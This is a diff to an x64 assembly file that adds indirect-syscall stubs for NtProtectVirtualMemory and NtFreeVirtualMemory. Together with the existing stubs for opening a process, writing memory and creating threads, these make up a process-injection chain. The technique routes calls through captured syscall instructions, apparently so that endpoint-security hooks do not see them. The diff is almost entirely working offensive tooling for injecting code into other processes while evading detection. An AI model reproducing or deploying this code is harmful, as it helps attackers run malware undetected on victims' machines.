@@ -1,21 +1,19 @@
 .data 
-;---------------------------------------------------------------
-; DIRECT SYSCALLS
 extern g_NtOpenProcessSSN:DWORD
-extern g_NtAllocateVirtualMemorySSN:DWORD
-extern g_NtWriteVirtualMemorySSN:DWORD
-extern g_NtCreateThreadExSSN:DWORD
-extern g_NtWaitForSingleObjectSSN:DWORD
-extern g_NtCloseSSN:DWORD
-;---------------------------------------------------------------
-; INDIRECT SYSCALLS
-; You can just use one syscall instruction instead of 
-; getting them for all the functions you use.
 extern g_NtOpenProcessSyscall:QWORD
+extern g_NtAllocateVirtualMemorySSN:DWORD
 extern g_NtAllocateVirtualMemorySyscall:QWORD
+extern g_NtWriteVirtualMemorySSN:DWORD
 extern g_NtWriteVirtualMemorySyscall:QWORD
+extern g_NtProtectVirtualMemorySSN:DWORD
+extern g_NtProtectVirtualMemorySyscall:QWORD
+extern g_NtCreateThreadExSSN:DWORD
 extern g_NtCreateThreadExSyscall:QWORD
+extern g_NtWaitForSingleObjectSSN:DWORD
 extern g_NtWaitForSingleObjectSyscall:QWORD
+extern g_NtFreeVirtualMemorySSN:DWORD
+extern g_NtFreeVirtualMemorySyscall:QWORD
+extern g_NtCloseSSN:DWORD
 extern g_NtCloseSyscall:QWORD
 
 .code
@@ -40,6 +38,13 @@ NtWriteVirtualMemory proc
 		ret                             
 NtWriteVirtualMemory endp
 
+NtProtectVirtualMemory proc
+		mov r10, rcx
+		mov eax, g_NtProtectVirtualMemorySSN       
+		jmp qword ptr g_NtProtectVirtualMemorySyscall                         
+		ret                             
+NtProtectVirtualMemory endp
+
 NtCreateThreadEx proc
 		mov r10, rcx
 		mov eax, g_NtCreateThreadExSSN      
@@ -53,6 +58,13 @@ NtWaitForSingleObject proc
 		jmp qword ptr g_NtWaitForSingleObjectSyscall                        
 		ret                             
 NtWaitForSingleObject endp
+
+NtFreeVirtualMemory proc
+		mov r10, rcx
+		mov eax, g_NtFreeVirtualMemorySSN      
+		jmp qword ptr g_NtFreeVirtualMemorySyscall                        
+		ret                             
+NtFreeVirtualMemory endp
 
 NtClose proc
 		mov r10, rcx
